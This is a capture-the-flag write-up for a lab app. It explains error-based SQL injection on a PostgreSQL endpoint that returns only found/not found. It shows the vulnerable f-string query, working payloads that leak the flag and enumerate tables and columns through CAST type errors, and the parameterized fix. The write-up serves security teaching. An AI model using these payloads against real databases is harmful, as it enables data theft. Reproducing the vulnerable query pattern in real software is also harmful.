# Level 1-4: Error-Based Data Extraction

**URL:** `/dashboard/perfil` (accessible only as cristiano / role: goat)

**Objective:** Extract the flag stored in the `segredos` table using error-based SQL injection. The endpoint returns no query results — only found/not found — so UNION-based extraction is blind. The raw PostgreSQL error message is returned in the response body.

## Vulnerable Code

```python
query = f"SELECT id, nome FROM transfers WHERE id = {player_id}"
cur.execute(query)
row = cur.fetchone()
```

The `id` parameter is injected directly into a numeric context (no quotes). The result is never surfaced — the response only says `{"encontrado": true/false}`. On exception, the full error string is returned as `{"error": "..."}`.

## Why UNION doesn't work here

The response carries no column data — only a boolean. Any `UNION SELECT` that returns rows would just flip the result to `true`, giving no way to read injected values.

## Attack Chain

### Step 1 — Confirm injection

```
1 AND 1=1--
```

Returns "Jogador encontrado." (player 1 exists, condition is true).

```
1 AND 1=2--
```

Returns "Jogador não encontrado." (condition is false). Injection is confirmed.

### Step 2 — Force a type-cast error with embedded data

PostgreSQL raises an error when a non-integer string is cast to `INTEGER`, and the error message includes the offending value:

```
1 AND 1=CAST((SELECT valor FROM segredos LIMIT 1) AS INTEGER)--
```

The server returns HTTP 500 with:

```
invalid input syntax for type integer: "JUMENTOS{err0r_b4s3d_pwn3d}"
```

The flag is embedded in the error message.

### Why this works

`CAST(... AS INTEGER)` is evaluated before the `AND` short-circuits. PostgreSQL raises `invalid input syntax for type integer: "<value>"` — leaking the value into the error string, which the backend passes straight to the response.

### Other useful error-based payloads

Enumerate table names:
```
1 AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0) AS INTEGER)--
```

Enumerate columns of `segredos`:
```
1 AND 1=CAST((SELECT column_name FROM information_schema.columns WHERE table_name='segredos' LIMIT 1 OFFSET 0) AS INTEGER)--
```

## Fixed Code

```python
query = "SELECT id, nome FROM transfers WHERE id = %s"
cur.execute(query, (player_id,))
```

Parameterized query prevents injection. Additionally, never return raw database error messages to the client.
